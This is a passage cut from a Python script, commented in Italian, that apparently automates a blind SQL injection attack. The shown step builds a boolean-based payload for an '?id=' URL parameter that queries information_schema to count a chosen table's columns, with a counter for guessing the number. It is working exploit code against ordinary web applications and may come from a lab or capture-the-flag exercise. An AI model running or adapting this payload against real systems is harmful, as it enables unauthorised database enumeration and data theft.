    else:
        print(f'Choosen name: {choosen}')  # Conferma la scelta
        
        # Fase 3a: Trovo il numero di colonne
        # Payload per contare le colonne nella tabella selezionata
        payload = f"?id=-1' OR NOT( NOT(id=3) OR NOT( (SELECT COUNT(column_name) FROM information_schema.columns WHERE table_name='{choosen}') = {{}} ) ) OR '0"   

        columns = 0  # Contatore colonne
